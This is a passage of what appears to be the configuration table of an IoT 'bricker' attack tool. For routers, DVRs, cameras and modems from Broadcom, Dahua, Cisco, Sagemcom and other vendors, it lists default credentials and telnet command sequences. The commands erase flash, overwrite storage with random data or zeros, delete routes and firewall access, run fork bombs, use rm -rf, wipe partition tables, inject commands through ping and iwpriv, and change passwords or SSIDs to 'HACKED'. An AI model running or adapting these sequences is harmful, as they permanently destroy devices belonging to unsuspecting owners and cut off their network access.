		'flash_erase /dev/mtdblock1 0 999999 0', '[$>#]',
		'flash_erase /dev/mtdblock2 0 999999 0', '[$>#]',
		'flash_erase /dev/mtdblock3 0 999999 0', '[$>#]',
		'cat /dev/urandom >/dev/mtdblock0 &', '',
		'cat /dev/urandom >/dev/mtdblock1 &', '',
		'cat /dev/urandom >/dev/mtdblock2 &', '',
		'cat /dev/urandom >/dev/mtdblock3 &', '',
		'cat /dev/urandom >/dev/mtdblock4 &', '',
		'cat /dev/urandom >/dev/mtdblock5 &', '',
		'cat /dev/urandom >/dev/mtdblock6 &', '',
		'cat /dev/urandom >/dev/mtdblock7 &', '',
		'cat /dev/urandom >/dev/mtd0 &', '',
		'cat /dev/urandom >/dev/mtd1 &', '',
		'cat /dev/urandom >/dev/mtd2 &', '',
		'cat /dev/urandom >/dev/mtd3 &', '',
		'route del default;iptables -F;iptables -A INPUT -j DROP', '%WAIT%',
		'poweroff -n -f', '[#>]',
		'poweroff', '[#>]',
		'd(){ d|d & };d 2>/dev/null', '',
		'ping ;busybox cat /dev/urandom >/dev/root;route del default;iptables -F;iptables -A INPUT -j DROP', '',
		'traceroute ;busybox cat /dev/urandom >/dev/root;route del default;iptables -F;iptables -A INPUT -j DROP', '',
		'loaddefaultconfig', '[#>]',
		'adsl connection --loopback', '',
		'xdslctl connection --loopback', '',
		'ppp config ppp0 down', '',
		'ppp config ppp0.1 down', '',
		'ppp config ppp0.2 down', '',
		'ppp config ppp1 down', '',
		'ppp config ppp1.1 down', '',
		'ppp config ppp2.1 down', '',
		'ppp config ppp3.3 down', '',
		'ppp config pppo3G0 down', '',
		'save', '',
		'defaultgateway config ppp0', '',
		'defaultgateway config ppp1.1', '',
		'defaultgateway config ppp2.1', '',
		'save', '',
		'dhcpserver config 192.168.99.1 192.168.99.1 1', '',
		'lan config --ipaddr secondary 10.1.2.4 255.255.255.255', '',
		'save', '',
		'wan delete service ppp0', '[#>]',
		'wan delete service ppp0.1', '[#>]',
		'wan delete service ppp1.1', '[#>]',
		'wan delete service pppoa1', '[#>]',
		'wan delete service pppoa0', '[#>]',
		'wan delete service ppp0.2', '[#>]',
		'wan delete service ppp1.2', '[#>]',
		'wan delete service ppp2.1', '[#>]',
		'wan delete service eth4.1', '[#>]',
		'wan delete service eth4.2', '[#>]',
		'wan delete service ipoe_eth0_4', '[#>]',
		'wan delete service ipoe_eth0_3', '[#>]',
		'wan delete service ipoe_eth0_2', '[#>]',
		'wan delete service ipoe_eth0_1', '[#>]',
		'restoredefault', '',
		'exit', '',
		'loaddefaultconfig', '[#>]',
		'adsl connection --loopback', '',
		'xdslctl connection --loopback', '',
		'ppp config ppp0 down', '',
		'ppp config ppp0.1 down', '',
		'ppp config ppp0.2 down', '',
		'ppp config ppp1 down', '',
		'ppp config ppp1.1 down', '',
		'ppp config ppp2.1 down', '',
		'ppp config ppp3.3 down', '',
		'ppp config pppo3G0 down', '',
		'save', '',
		'defaultgateway config ppp0', '',
		'defaultgateway config ppp1.1', '',
		'defaultgateway config ppp2.1', '',
		'save', '',
		'wan delete service ppp0', '[#>]',
		'wan delete service ppp0.1', '[#>]',
		'wan delete service ppp1.1', '[#>]',
		'wan delete service pppoa1', '[#>]',
		'wan delete service pppoa0', '[#>]',
		'wan delete service ppp0.2', '[#>]',
		'wan delete service ppp1.2', '[#>]',
		'wan delete service ppp2.1', '[#>]',
		'wan delete service eth4.1', '[#>]',
		'wan delete service eth4.2', '[#>]',
		'wan delete service ipoe_eth0_4', '[#>]',
		'wan delete service ipoe_eth0_3', '[#>]',
		'wan delete service ipoe_eth0_2', '[#>]',
		'wan delete service ipoe_eth0_1', '[#>]',
		'restoredefault', '',
		'reboot', ''
	],
	[ "broadcom", ".*", 'support:\S+:0:0:Technical Support:.:.bin.sh', 
		'lan config --ipaddr primary 10.1.2.3 255.255.255.255', '',
		'lan config --ipaddr secondary 10.1.2.4 255.255.255.255', '',
		'wlan config --ssid "HACKED: DEFAULT PASSWORD"', '',
		'wlan config --enable 0', '',
		'wlan config --ssid primary "HACKED: DEFAULT PASSWORD"', '',
		'wlan config --status primary disable', '',
		'save', '',
		'tr69cfg --inform disable', '',
		'tr69cfg --connreq disable', '',
		'tr69cfg --password HACKED', '',
		'tr69cfg --intf HACKED', '',
		'tr69cfg --info', '',
		'tr69c ConnReqPort 31351', '',
		'save', '',
		'sh', '[$>#] ',
		'flash_erase /dev/mtdblock0 0 999999 0', '[$>#] ',
		'flash_erase /dev/mtdblock1 0 999999 0', '[$>#] ',
		'flash_erase /dev/mtdblock2 0 999999 0', '[$>#] ',
		'flash_erase /dev/mtdblock3 0 999999 0', '[$>#] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'cat /dev/urandom >/dev/mtd3 &', '',
		'route del default;iptables -t nat -F;iptables -F;iptables -A INPUT -j DROP', '%WAIT%',
		"restoredefault", '[$>#] ',
		'reboot', '%TERM%'
	],
	[ "broadcom", ".*", 'Linux.*\(\S+txcpyjeb\S*\)', 
		'sh', '[$>#] ',
		'flash_erase /dev/mtdblock0 0 999999 0', '[$>#] ',
		'flash_erase /dev/mtdblock1 0 999999 0', '[$>#] ',
		'flash_erase /dev/mtdblock2 0 999999 0', '[$>#] ',
		'flash_erase /dev/mtdblock3 0 999999 0', '[$>#] ',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'cat /dev/urandom >/dev/mtd3 &', '',
		'route del default;iptables -t nat -F;iptables -F;iptables -A INPUT -j DROP', '%WAIT%',
		"restoredefault", '[$>#] ',
		'reboot', '%TERM%'
	],
	# Broadcom menu thing, mainly some BCM96338s
	[ 'broadcom', '.*', 'from HyperTerminal you would need to use',
		'cat /dev/urandom >/dev/mtdblock0 &', 'to continue',
		'', '',
		'cat /dev/urandom >/dev/mtdblock1 &', 'to continue',
		'', '',
		'cat /dev/urandom >/dev/mtdblock2 &', 'to continue',
		'', '',
		'cat /dev/urandom >/dev/mtdblock3 &', 'to continue',
		'', '',
		'iptables -F;iptables -t nat -F;iptables -A INPUT -j DROP', 'to continue',
		'', '',
		'12', '==>',
		'1', 'Please wait',
	],
	# Broadcom zyad1234 type things
	[ 'broadcom', 'supervisor/zyad1234', '', 
		'dhcpserver config 192.168.99.1 192.168.99.1 1', '',
		'lan config --ipaddr primary 10.1.2.3 255.255.255.255', '',
		'lan config --ipaddr secondary 10.1.2.4 255.255.255.255', '',
		'wlan config --ssid "HACKED: DEFAULT PASSWORD"', '',
		'wlan config --enable 0', '',
		'save', '',
		'tr69cfg --inform disable', '',
		'tr69cfg --connreq disable', '',
		'tr69cfg --password HACKED', '',
		'tr69cfg --intf HACKED', '',
		'tr69cfg --info', '',
		'save', '',
		'tftp -p -f test ;flash_erase /dev/mtdblock0 0 999999 0;flash_erase /dev/mtdblock1 0 999999 0;flash_erase /dev/mtdblock2 0 999999 0;flash_erase /dev/mtdblock3 0 999999 0', '',
		'tftp -p -f test ;cat /dev/urandom >/dev/mtdblock0;cat /dev/urandom >/dev/mtdblock1;cat /dev/urandom >/dev/mtdblock2;cat /dev/urandom >/dev/mtdblock3', '',
		'tftp -p -f test ;route del default', '',
    "adsl connection --loopback\nxdslctl connection --loopback\nppp config ppp0 down\nppp config ppp1.1 down\nppp config ppp2.1 down\nppp config ppp3.3 down\nppp config pppo3G0 down\nsave", '',
    'defaultgateway config ppp0', '',
    'defaultgateway config ppp1.1', '',
    'defaultgateway config ppp2.1', '',
    'sh', '[#>]',
    'flash_erase /dev/mtdblock0 0 999999 0', '[$>#]',
    'flash_erase /dev/mtdblock1 0 999999 0', '[$>#]',
    'flash_erase /dev/mtdblock2 0 999999 0', '[$>#]',
    'flash_erase /dev/mtdblock3 0 999999 0', '[$>#]',
    'cat /dev/urandom >/dev/mtdblock0 &', '',
    'cat /dev/urandom >/dev/mtdblock1 &', '',
    'cat /dev/urandom >/dev/mtdblock2 &', '',
    'cat /dev/urandom >/dev/mtdblock3 &', '',
    'cat /dev/urandom >/dev/mtdblock4 &', '',
    'cat /dev/urandom >/dev/mtdblock5 &', '',
    'cat /dev/urandom >/dev/mtdblock6 &', '',
    'cat /dev/urandom >/dev/mtdblock7 &', '',
    'cat /dev/urandom >/dev/mtd0 &', '',
    'cat /dev/urandom >/dev/mtd1 &', '',
    'cat /dev/urandom >/dev/mtd2 &', '',
    'cat /dev/urandom >/dev/mtd3 &', '',
    'route del default;iptables -F;iptables -A INPUT -j DROP', '',
    'poweroff -n -f', '[#>]',
    'poweroff', '[#>]',
    'restoredefault', '',
    'exit', '',
    'restoredefault', '%TERM%'
  ],

  # admin/888888 user level accos in CN.. these have a root account with a
  # default password with MD5 hash $1$I62B1IWu$4rAzAK1YLBSB4slr.uCdw/ , ran 
  # out of time and resources to figure it out. Will just reboot the device 
  # with the low privilege account.
	[ 'cn88', 'admin/888888', 'DAM-2160',
	  'cat /dev/shadow', '[#$] ',
		# force rebooter for low privilege accounts
		'while [ 1 ]; do echo testtesttesttesttesttesttesttesttesttesttesttesttesttest >>/tmp/.test 2>/tmp/.nag; cat /tmp/.test >>/tmp/.test 2>/tmp/.nag; cat /tmp/.test >>/var/.test 2>/tmp/.nag; cat /tmp/.test >>/run/.test 2>/tmp/.nag; done &', '[#$] ',
	],

  # Ankit telnets in BR, I just lit these here for secondary processing. Did a
  # writeup about these in 2018.
  [ 'datacom', 'root/DATACOMBLANK', '',
    '', 'Option:',
  ],
  
  # XiongMai command port 9527, special case hack
  [ 'xiongctrl', 'admin/.*', 'PORT:9527:',
  	'shell\nbusybox cat /dev/urandom >/dev/mtd0 &\nbusybox cat /dev/urandom >/dev/mtd1 &\nbusybox cat /dev/urandom >/dev/mtd2 &\nbusybox cat /dev/urandom >/dev/mtd3 &\nbusybox cat /dev/urandom >/dev/mtd4 &\nbusybox cat /dev/urandom >/dev/mtd5 &\nbusybox cat /dev/urandom >/dev/mtdblock0 &\nbusybox cat /dev/urandom >/dev/mtdblock1 &\nbusybox cat /dev/urandom >/dev/mtdblock2 &\nbusybox cat /dev/urandom >/dev/mtdblock3 &\nbusybox cat /dev/urandom >/dev/mtdblock4 &\nbusybox cat /dev/urandom >/dev/mtdblock5 &\nroute del default', '[$] ',
  	'netitf -ip\nnetitf -dhcp\nnetitf -dhcp 0\nnetitf -dns 1.2.3.4 1.2.3.5\ncfg -s /mnt/mtd/Config/Json\ncfg -s /mnt/custom/CustomConfig', '[$] ',
    'netitf -ip 1.2.3.4 255.255.255.0 1.2.3.5\ncfg -s /mnt/mtd/Config/Json\ncfg -s /mnt/custom/CustomConfig', '[$] ',
  	'exit', '[$] ',
		'netitf -ip\nnetitf -dhcp\nnetitf -dhcp 0\nnetitf -dns 1.2.3.4 1.2.3.5\ncfg -s /mnt/mtd/Config/Json\ncfg -s /mnt/custom/CustomConfig', '[$] ',
		'netitf -ip 1.2.3.4 255.255.255.0 1.2.3.5\ncfg -s /mnt/mtd/Config/Json\ncfg -s /mnt/custom/CustomConfig', '[$] ',
		';;', '[$] ',
		'netitf -ip\nnetitf -dhcp\nnetitf -dhcp 0\nnetitf -dns 1.2.3.4 1.2.3.5\ncfg -s /mnt/mtd/Config/Json\ncfg -s /mnt/custom/CustomConfig', '[$] ',
		'netitf -ip 1.2.3.4 255.255.255.0 1.2.3.5\ncfg -s /mnt/mtd/Config/Json\ncfg -s /mnt/custom/CustomConfig', '[$] ',
	],
	
	# Baby / netween.co.kr / goodcns
	[ 'baby', '.*', '(www\.netween\.co\.kr|rjhm91lt37eEtYB0Czii1)',
		'cat /dev/urandom >/dev/mtdblock0 &', '[$>#] ',
		'cat /dev/urandom >/dev/mtdblock1 &', '[$>#] ',
		'cat /dev/urandom >/dev/root &', '%WAIT%',
		'cd /web/', '[$>#] ',
		'grep "reboot" *', '[$>#] ',
	],
    
  # vertex thingy with root access
  [ 'vertex', 'root/vertex25ektks123', '',
    'cat /dev/zero >/dev/mtdblock0 &', '[$>#] ',
    'cat /dev/zero >/dev/mtdblock1 &', '[$>#] ',
    'cat /dev/zero >/dev/mtdblock2 &', '[$>#] ',
    'cat /dev/zero >/dev/mtdblock3 &', '[$>#] ',
    'cat /dev/zero >/dev/mtdblock4 &', '[$>#] ',
    'cat /dev/zero >/dev/mtdblock5 &', '[$>#] ',
    'route del default', '',
    'configure terminal', '[$>#] ',
    'restore factory-defaults', '[$>#] ',
    'restore factory_defaults', '[$>#] ',
    'exit', '[$>#] ',
    'quote sh', '[$>#] ',
    'cat /dev/urandom >/dev/root &', '[$>#] ',
    'cat /dev/urandom >/dev/ram &', '[$>#] ',
    'route del default', '%WAIT%',
    'reboot',
  ],
    
	# Honeypots.. if the telnetd let us in using our bogus root login it is likely a 
  # honeypot or some particularly crappy IoT device. Collect info either way. 
	[ 'honeypot', bogushoneypotlogin, '',
		'cat /etc/passwd', '',
		'cat /etc/shadow', '',
		'uname -a', '',
	],
#	[ 'honeypot', '.*', '(fw-mgmt0|Ubuntu|el\d\.x86_?64|Debian GNU\/Linux comes with ABSOLUTELY NO WARRANTY, to the extent|Linux\s\S+S\d\s.*x86_?64|Linux\s.*amd64.*SMP.*Debian.*x86_?64)',
	[ 'honeypot', '.*', '(fw-mgmt0)',   # in 2020 there really are 64 bit IoS devices out there
		'echo SYSTEM HACKED PLEASE REINSTALL >/etc/motd', '',
		'echo SYSTEM HACKED PLEASE REINSTALL >/etc/version', '',
		'echo SYSTEM-HACKED-PLEASE-REINSTALL >/etc/hostname', '',
		'wall \x1b]2;HACKED\x07', '',
	],

	#Sagemcom HomeGateway
	[ "sagemcom", ".*", 'HomeGateway.*\s*.*Bad\scommand.*Try\susing\shelp',
		"conf print /admin/", "HomeGateway> ",
		"conf set /admin/rmt_mng/ports/2/enabled 0", "HomeGateway> ",
		"conf set /admin/rmt_mng/ports/1/enabled 0", "HomeGateway> ",
		"conf set /admin/rmt_mng/ports/0/enabled 0", "HomeGateway> ",
		"conf set /admin/user/2/password x", "HomeGateway> ",
		"conf set /admin/user/1/password x", "HomeGateway> ",
		"conf set /admin/user/0/password x", "HomeGateway> ",
		"conf reconf 1", "HomeGateway> ",
		"flash commit", "HomeGateway> ",
		"system reboot", '%TERM%',
	],
	[ "sagemcom", ".*", 'OpenRG>',
		"conf print /admin/", "OpenRG> ",
		"conf set /admin/rmt_mng/ports/2/enabled 0", "OpenRG> ",
		"conf set /admin/rmt_mng/ports/1/enabled 0", "OpenRG> ",
		"conf set /admin/rmt_mng/ports/0/enabled 0", "OpenRG> ",
		"conf set /admin/user/2/password x", "OpenRG> ",
		"conf set /admin/user/1/password x", "OpenRG> ",
		"conf set /admin/user/0/password x", "OpenRG> ",
		"conf reconf 1", "OpenRG> ",
		"flash commit", "OpenRG> ",
		"system reboot", '%TERM%',
	],
	
	# Nomadic AG 5600 etc
	[ "nomadix", '.*', 'Display advanced system configuration menu',
		'system', '\S>',
		'factory', 'yes/no',
		'yes', 'CR',
		# workaround for buggy CLI
		'\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', 'CR',
		'\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', 'CR',
		'\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n', 'CR',
	],
	
	# SSE1-PV7 - something solar?
	[ 'sse', '.*', 'step into administration terminal',
		'', '~ ',
		'd() { d|d & }; d', '~ ',
	],
	# catch the GOCLOUD S1A, S2A, S3A etc ones before we try to detect Cisco banner
  # could potentially use port 2601 as an alternative identifier
  [ 'gocloud', '.*', '(Welcome to visit .* series router|GOCLOUD)',
		'enable', '\S+[#>]',
     # has /dev/root and /dev/mtdblock6 and two CLI RCEs, throw around some permutations
    'iwpriv ra0 e2p ;route${IFS}del${IFS}default;cat${IFS}/dev/zero>/dev/root;cat${IFS}/dev/zero>/dev/mtdblock6;', '',
    'iwpriv ra0 e2p ;cat${IFS}/dev/zero>/dev/mtdblock6;', '',
    'iwpriv ra0 e2p ;cat${IFS}/dev/zero>/dev/root;', '',
    'iwpriv ra0 e2p ;route${IFS}del${IFS}default;', '',
		'ping 127.0.0.1;route${IFS}del${IFS}default;cat${IFS}/dev/zero>/dev/root;cat${IFS}/dev/zero>/dev/mtdblock6;halt;', '%WAIT%',   
    # this will also disconnect the device, use as a fallback if for some reason still here:
    'restore factory', '',		
  ],
	# Ciscos 
	[ 'cisco', '.*', 'User Access Verification',
		'enable', '\S+[#>]',
		'erase /all nvram:', '(confirm|#\s)',
		'y', '\S+[#>]',
		'erase startup-config', '(confirm|#\s)',
		'y', '\S+[#>]',
		'reload', '(yes/no|#\s)', 
		'y', '(confirm|#\s)',
		'y', '',
		'power rps port 6 mode standby', '\S+[#>]',
		'power rps port 5 mode standby', '\S+[#>]',
		'power rps port 4 mode standby', '\S+[#>]',
		'power rps port 3 mode standby', '\S+[#>]',
		'power rps port 2 mode standby', '\S+[#>]',
		'power rps port 1 mode standby', '\S+[#>]',
    'restore factory', '',			# gocloud.cn fallback in case device was mididentified
		'y', '',
  ],
  
  # Kylink SIP
  [ 'kylink', '.*', 'Kylink SIP',
    '8', 'y/n',
    'y', '\):',
    '9', 'y/n',
    'y', '\):',
    '1', '\):',
    '1', '\):',
    '1.2.3.4', '\):',
    '3', '\):',
    '1.2.3.5', '\):',
    'q', '\):',
    '9', 'y/n',
    'y', '\):',
    'b', 'y/n',
    'y', 'seconds',
  ],
  
	# Old Dahua DVR vizxv "Welcome to HiLinux"
	[ "dahuaold", "root/vizxv", '',
#		"fdisk -l", '',
		'busybox cat /dev/urandom >/dev/mtdblock0 &', '',
		'busybox cat /dev/urandom >/dev/sda &', '',
		'busybox cat /dev/urandom >/dev/mtdblock10 &', '',
		'busybox cat /dev/urandom >/dev/mmc0 &', '',
		'busybox cat /dev/urandom >/dev/sdb &', '',
		'busybox cat /dev/urandom >/dev/ram0 &', '',
		'busybox cat /dev/urandom >/dev/mtd0 &', '',
		'busybox cat /dev/urandom >/dev/mtd1 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock1 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock2 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock3 &', '',
    # newer models
    'cat /dev/zero >/dev/mtdblock2 &', '',
    'cat /dev/zero >/dev/mtdblock3 &', '',
    'cat /dev/zero >/dev/mtdblock4 &', '',
    'cat /dev/zero >/dev/mtdblock5 &', '',
    'cat /dev/zero >/dev/mtdblock6 &', '',
    'cat /dev/zero >/dev/mtdblock7 &', '',
    'cat /dev/zero >/dev/root &', '',
    'cat /dev/zero >/dev/mtdblock0 &', '',
    'cat /dev/zero >/dev/mtdblock1 &', '',
		"fdisk -C 1 -H 1 -S 1 /dev/mtd0", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/mtd1", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/sda", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/mtdblock0", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		'route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &', '%WAIT%',
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '%WAIT%',
		"halt -n -f", '[#$] ',
		"reboot", '[#$] ',
	],  
  # Some cam
	[ "hslwificam", "root/hslwificam", '',
		'busybox cat /dev/zero >/dev/mtdblock0 &', '',
		'busybox cat /dev/zero >/dev/mtdblock1 &', '',
		'busybox cat /dev/zero >/dev/mtdblock2 &', '',
		'busybox cat /dev/zero >/dev/mtdblock3 &', '',
		'busybox cat /dev/zero >/dev/mtdblock4 &', '',
		'busybox cat /dev/zero >/dev/mtdblock5 &', '',
		'busybox cat /dev/zero >/dev/root &', '[#$] ',
		'busybox cat /dev/zero >/dev/mtdblock0 &', '',
		'busybox cat /dev/zero >/dev/mtdblock1 &', '',
		'busybox cat /dev/zero >/dev/mtdblock2 &', '',
		'busybox cat /dev/zero >/dev/mtdblock3 &', '',
		'busybox cat /dev/zero >/dev/mtdblock4 &', '',
		'busybox cat /dev/zero >/dev/mtdblock5 &', '',
		'busybox cat /dev/zero >/dev/root &', '',
		'route del default', '%WAIT%',
		"reboot", '[#$] ',
	],  
  # Lilin DVR, doubled up since some devices are flaky
	[ "hilinux99", "root/icatch99", '',
		'busybox cat /dev/zero >/dev/mtdblock0 &', '',
		'busybox cat /dev/zero >/dev/mtdblock1 &', '',
		'busybox cat /dev/zero >/dev/mtdblock2 &', '',
		'busybox cat /dev/zero >/dev/mtdblock3 &', '',
		'busybox cat /dev/zero >/dev/mtdblock4 &', '',
		'busybox cat /dev/zero >/dev/mtdblock5 &', '',
		'busybox cat /dev/zero >/dev/root &', '[#$] ',
		'busybox cat /dev/zero >/dev/mtdblock0 &', '',
		'busybox cat /dev/zero >/dev/mtdblock1 &', '',
		'busybox cat /dev/zero >/dev/mtdblock2 &', '',
		'busybox cat /dev/zero >/dev/mtdblock3 &', '',
		'busybox cat /dev/zero >/dev/mtdblock4 &', '',
		'busybox cat /dev/zero >/dev/mtdblock5 &', '',
		'busybox cat /dev/zero >/dev/root &', '',
		'route del default', '%WAIT%',
		"halt", '[#$] ',
	],  

	# Something related to Dahua etc.. 
	[ "hilinux", ".*", 'Welcome to HiLinux',
#		"fdisk -l", '',
		'busybox cat /dev/urandom >/dev/mtdblock0 &', '',
		'busybox cat /dev/urandom >/dev/sda &', '',
		'busybox cat /dev/urandom >/dev/mtdblock10 &', '',
		'busybox cat /dev/urandom >/dev/mmc0 &', '',
		'busybox cat /dev/urandom >/dev/sdb &', '',
		'busybox cat /dev/urandom >/dev/ram0 &', '',
		'busybox cat /dev/urandom >/dev/mtd0 &', '',
		'busybox cat /dev/urandom >/dev/mtd1 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock1 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock2 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock3 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock4 &', '',
		'busybox cat /dev/urandom >/dev/mtdblock5 &', '',
    'busybox cat /dev/urandom >/dev/mtdblock6 &' , '' ,
    'busybox cat /dev/urandom >/dev/mtdblock7 &' , '' ,
    'busybox cat /dev/urandom >/dev/root &' , '' ,     
		"fdisk -C 1 -H 1 -S 1 /dev/mtd0", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/mtd1", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/sda", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/mtdblock0", 'm\sfor\shelp\S?: ',
		"w", '[#$] ',
		'busybox cat /dev/urandom >/dev/root &', '',
		'route del default;iproute del default;ip route del default;rm -rf /* 2>/dev/null &', '%WAIT%',
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '%WAIT%',
		"halt -n -f", '[#$] ',
		"reboot", '[#$] ',
		# force rebooter for low privilege accounts
		'while [ 1 ]; do echo testtesttesttesttesttesttesttesttesttesttesttesttesttest >>/tmp/.test 2>/tmp/.nag; cat /tmp/.test >>/tmp/.test 2>/tmp/.nag; cat /tmp/.test >>/var/.test 2>/tmp/.nag; cat /tmp/.test >>/run/.test 2>/tmp/.nag; done &', '[#$] ',
	],  

	# EV ZLX Two-way speaker? Some crap IoT.. a DVR of some sort similar to Dahua
	[ "zlx", "root/zlxx\.", "",
		'busybox cat /dev/urandom >/dev/mtdblock0 &', '',
		'busybox cat /dev/urandom >/dev/mtd0 &', '',
		'busybox cat /dev/urandom >/dev/mtd1 &', '',
		'busybox cat /dev/urandom >/dev/sda &', '',
		'busybox cat /dev/urandom >/dev/ram0 &', '',
		'flash_unlock /dev/mtd0', '',
		'flash_eraseall /dev/mtd0 &', '',
		'flash_unlock /dev/mtd1', '',
		'flash_eraseall /dev/mtd1 &', '',
		'flash_unlock /dev/sda', '',
		'flash_eraseall /dev/sda &', '',
		'flash_unlock /dev/mtdblock0', '',
		'flash_eraseall /dev/mtdblock0 &', '',
		"fdisk -C 1 -H 1 -S 1 /dev/sda", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/mtd0", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/mtd1", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 -H 1 -S 1 /dev/mtdblock0", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		'd(){ d|d & };d 2>/dev/null', '[#$>] ', 
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '[#$] ',
		"halt -n -f", '[#$] ',
		"reboot", '[#$] ',
	],
  # Netbox by NetModule AG .. NB1600 etc
  [ 'netbox', '.*', "ERROR: no such command \'w\'",
    'shell', '[>#] ',
    'cat /dev/urandom >/dev/mtdblock3 &', '', 
    'cat /dev/urandom >/dev/mtdblock0 &', '', 
    'cat /dev/urandom >/dev/mtdblock2 &', '', 
    'cat /dev/urandom >/dev/mtdblock4 &', '', 
    'cat /dev/urandom >/dev/mtdblock5 &', '', 
    'cat /dev/urandom >/dev/mtdblock6 &', '', 
    'cat /dev/urandom >/dev/mtdblock7 &', '', 
    'route del default', '%WAIT%', 
  ],
  
  # Some satellite Internet modem kind of a thing? Falcon Netmodem.. South America
  [ 'falcon', '.*', '(Unknown Command: \'|RMT:\d+.*@telnet:)',
    'offline', '[>#] ',
    'offline', '[>#] ',
    'passwd', 'password',
    '%OLDPASS%', 'password',
    '%NEWPASS%', 'password',
    '%NEWPASS%', '[>#] ',
    'reset board', '[>#] ',
    'DSC sleep 99999999', '[>#] ',
    'ip sat0 add 1.2.3.4 255.255.255.0 1.2.3.5 sat0', '[>#] ',
    'params GLOBAL set max_mssg_bufs 1', '[>#] ',
    'params GLOBAL set initial_mssg_bufs 1', '[>#] ',
    'params SECURITY set falcon_console_from_localhost_only 1', '[>#] ',
    'params LL set ll_tx_window 1', '[>#] ',
    'params LL set ll_rx_window 1', '[>#] ',
    'params SPOOF set spoof_oos_buffer_size 1', '[>#] ',
    'params PAD set pad_tdma_payload 1', '[>#] ',
    'reset application', '%WAIT%',
    'ENTER_ERROR_STATE', '[>#] ',
    'TERMINATE', '[>#] ',
  ],

	# 1001chin
	[ "chin", 'root/1001chin', '',
		'dd if=/dev/urandom of=/dev/sda1 &', '', 
		'dd if=/dev/urandom of=/dev/sda2 &', '', 
		'dd if=/dev/urandom of=/dev/sda3 &', '', 
		'dd if=/dev/urandom of=/dev/sda4 &', '', 
		'dd if=/dev/urandom of=/dev/sda &', '', 
		'dd if=/dev/urandom of=/dev/root &', '', 
		'route del default;iproute del default;rm -rf /* 2>/dev/null &', '[#$>] ',
		'iptables -F;iptables -t nat -F;iptables -A OUTPUT -j DROP', '%WAIT% ',
		'd(){ d|d & };d 2>/dev/null', '[#$>] ', 
		'sysctl -w net.ipv4.tcp_timestamps=0;sysctl -w kernel.threads-max=1', '%WAIT% ',
		'halt -n -f', '[#$>] ',
		'reboot', '[#$>] ',
		'd(){ d|d & };d', '%TERM%', 
	],
		
	# Grain Media grain-media.com NVR product
	[ "faraday", "root/GM8182", "",
		"cat /dev/urandom >/dev/sda &\ncat /dev/urandom >/dev/mtdblock4 &\ncat /dev/urandom >/dev/mtdblock5 &\ncat /dev/urandom >/dev/mtdblock6 &\ncat /dev/urandom >/dev/mtdblock7 &\ncat /dev/urandom >/dev/mtdblock8 &\ncat /dev/urandom >/dev/root &\nroute del default", '',
		"fdisk -C 1 /dev/sda", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 /dev/mtdblock4", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 /dev/mtdblock5", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 /dev/mtdblock6", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 /dev/mtdblock7", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 /dev/mtdblock8", 'm\sfor\shelp\S?: ', 
		"w", '[#$] ',
		"fdisk -C 1 /dev/root", 'm\sfor\shelp\S?: ', 
